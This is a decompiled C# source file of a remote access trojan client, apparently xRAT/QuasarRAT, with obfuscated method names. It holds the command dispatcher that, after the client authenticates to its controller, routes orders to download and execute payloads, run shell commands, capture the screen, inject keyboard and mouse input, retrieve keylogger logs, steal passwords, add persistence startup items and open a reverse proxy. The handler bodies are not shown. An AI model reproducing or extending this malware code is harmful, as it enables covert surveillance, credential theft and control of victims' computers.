using System;
using xClient.Core.Networking;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.ReverseProxy;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.Packets
{
	// Token: 0x0200008C RID: 140
	public static class PacketHandler
	{
		// Token: 0x060003A4 RID: 932 RVA: 0x0000F6F4 File Offset: 0x0000D8F4
		public static void HandlePacket(Client client, IPacket packet)
		{
			Type type = packet.GetType();
			if (!GClass0.IsAuthenticated)
			{
				if (type == typeof(GetAuthentication))
				{
					GClass17.smethod_0((GetAuthentication)packet, client);
					return;
				}
				if (type == typeof(SetAuthenticationSuccess))
				{
					GClass0.IsAuthenticated = true;
				}
				return;
			}
			else
			{
				if (type == typeof(DoDownloadAndExecute))
				{
					GClass17.smethod_9((DoDownloadAndExecute)packet, client);
					return;
				}
				if (type == typeof(DoUploadAndExecute))
				{
					GClass17.smethod_10((DoUploadAndExecute)packet, client);
					return;
				}
				if (type == typeof(DoClientDisconnect))
				{
					Class10.smethod_4(false);
					return;
				}
				if (type == typeof(DoClientReconnect))
				{
					Class10.smethod_4(true);
					return;
				}
				if (type == typeof(DoClientUninstall))
				{
					GClass17.smethod_2((DoClientUninstall)packet, client);
					return;
				}
				if (type == typeof(GetDesktop))
				{
					GClass17.smethod_14((GetDesktop)packet, client);
					return;
				}
				if (type == typeof(GetProcesses))
				{
					GClass17.smethod_25((GetProcesses)packet, client);
					return;
				}
				if (type == typeof(DoProcessKill))
				{
					GClass17.smethod_27((DoProcessKill)packet, client);
					return;
				}
				if (type == typeof(DoProcessStart))
				{
					GClass17.smethod_26((DoProcessStart)packet, client);
					return;
				}
				if (type == typeof(GetDrives))
				{
					GClass17.smethod_19((GetDrives)packet, client);
					return;
				}
				if (type == typeof(GetDirectory))
				{
					GClass17.smethod_3((GetDirectory)packet, client);
					return;
				}
				if (type == typeof(DoDownloadFile))
				{
					GClass17.smethod_4((DoDownloadFile)packet, client);
					return;
				}
				if (type == typeof(DoUploadFile))
				{
					GClass17.smethod_6((DoUploadFile)packet, client);
					return;
				}
				if (type == typeof(DoMouseEvent))
				{
					GClass17.smethod_15((DoMouseEvent)packet, client);
					return;
				}
				if (type == typeof(DoKeyboardEvent))
				{
					GClass17.smethod_16((DoKeyboardEvent)packet, client);
					return;
				}
				if (type == typeof(GetSystemInfo))
				{
					GClass17.smethod_24((GetSystemInfo)packet, client);
					return;
				}
				if (type == typeof(DoVisitWebsite))
				{
					GClass17.smethod_11((DoVisitWebsite)packet, client);
					return;
				}
				if (type == typeof(DoShowMessageBox))
				{
					GClass17.smethod_12((DoShowMessageBox)packet, client);
					return;
				}
				if (type == typeof(DoClientUpdate))
				{
					GClass17.smethod_1((DoClientUpdate)packet, client);
					return;
				}
				if (type == typeof(GetMonitors))
				{
					GClass17.smethod_17((GetMonitors)packet, client);
					return;
				}
				if (type == typeof(DoShellExecute))
				{
					GClass17.smethod_28((DoShellExecute)packet, client);
					return;
				}
				if (type == typeof(DoPathRename))
				{
					GClass17.smethod_8((DoPathRename)packet, client);
					return;
				}
				if (type == typeof(DoPathDelete))
				{
					GClass17.smethod_7((DoPathDelete)packet, client);
					return;
				}
				if (type == typeof(DoShutdownAction))
				{
					GClass17.smethod_20((DoShutdownAction)packet, client);
					return;
				}
				if (type == typeof(GetStartupItems))
				{
					GClass17.smethod_21((GetStartupItems)packet, client);
					return;
				}
				if (type == typeof(DoStartupItemAdd))
				{
					GClass17.smethod_22((DoStartupItemAdd)packet, client);
					return;
				}
				if (type == typeof(DoStartupItemRemove))
				{
					GClass17.smethod_23((DoStartupItemRemove)packet, client);
					return;
				}
				if (type == typeof(DoDownloadFileCancel))
				{
					GClass17.smethod_5((DoDownloadFileCancel)packet, client);
					return;
				}
				if (type == typeof(GetKeyloggerLogs))
				{
					GClass17.smethod_18((GetKeyloggerLogs)packet, client);
					return;
				}
				if (type == typeof(GetPasswords))
				{
					GClass17.smethod_13((GetPasswords)packet, client);
					return;
				}
				if (type == typeof(ReverseProxyConnect) || type == typeof(ReverseProxyConnectResponse) || type == typeof(ReverseProxyData) || type == typeof(ReverseProxyDisconnect))
				{
					ReverseProxyCommandHandler.HandleCommand(client, packet);
				}
				return;
			}
		}
	}
}
